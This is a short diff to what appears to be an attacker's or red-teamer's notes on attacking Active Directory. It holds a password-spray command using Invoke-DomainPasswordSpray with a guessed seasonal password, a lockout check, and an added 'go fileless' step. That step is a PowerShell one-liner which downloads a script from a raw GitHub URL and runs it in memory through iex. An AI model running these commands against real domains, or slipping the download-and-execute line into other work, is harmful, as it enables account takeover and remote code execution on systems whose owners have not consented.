@@ -14,7 +14,8 @@ Process:
 6.C. Run the script - Invoke-DomainPasswordSpray -Password Summer2020 -OutFile results.txt
 6.D. Observe - Search-ADAccount –LockedOut. Problems? Use control C and punt. Wait a bunch before you try again. 
 
-7. Kick it up a notch: 
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://...')"
+7. Kick it up a notch maybe? Go fileless?
+powershell -nop -c "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/OnlyTheShadowKnows/AD/master/ADcounts.ps1')"
+
 
 
